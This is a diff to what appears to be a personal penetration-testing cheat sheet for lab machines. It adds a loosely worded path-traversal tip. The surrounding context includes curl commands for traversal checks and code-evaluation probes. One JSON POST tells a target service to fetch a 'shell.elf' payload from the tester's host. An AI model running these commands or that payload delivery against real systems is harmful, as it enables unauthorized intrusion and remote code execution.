@@ -45,6 +45,9 @@
 # Web Enum
 - curl traversal check ``` curl --path-as-is {URL} ```
 
+## Traversal with gobuster if can access machine file system
+- e.g. ../../...../Users/Hayer/{Gobuster}.txt .pdf etc...
+
 - curl POST ``` curl -X POST -d "code=2*2" http://192.168.171.117:50000/verify```
 
 - curl POST w/ JSON ``` curl -v -X POST -H "Content-Type: application/json" -d '{"user":"clumsyadmin", "url":"http://192.168.45.197/shell.elf"}' "http://192.168.173.134:13337/update"  ```
